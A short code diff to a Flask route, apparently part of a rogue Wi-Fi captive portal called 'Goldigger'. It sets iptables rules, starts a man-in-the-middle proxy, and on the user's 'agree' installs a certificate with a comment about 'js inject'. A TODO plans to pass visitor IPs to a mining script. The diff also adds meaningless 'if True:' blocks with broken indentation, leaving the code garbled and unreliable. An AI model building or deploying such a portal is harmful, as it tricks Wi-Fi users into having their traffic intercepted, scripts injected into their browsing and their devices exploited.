@@ -12,12 +12,14 @@ controller = Blueprint('/Goldigger', __name__, url_prefix = '/Goldigger')
 def welcome():
     if request.method == 'GET':
         models.configure_iptables()
-        load_mitm.ProxyMaster.run()
-        return render_template('wifi_m/landing_page/index.html')
+        if True:
+            load_mitm.ProxyMaster.run()
+            return render_template('wifi_m/landing_page/index.html')
     else:
         if request.form['submit'] == 'agree':
             models.get_cert() #certificate and js inject
             #TODO locate current IP address, append to txt file, and pass onto mining py file
+                if True:
                 return redirect ('http://www.google.com', code = 302)
         else:
             return redirect ('/Golddigger/Welcome')
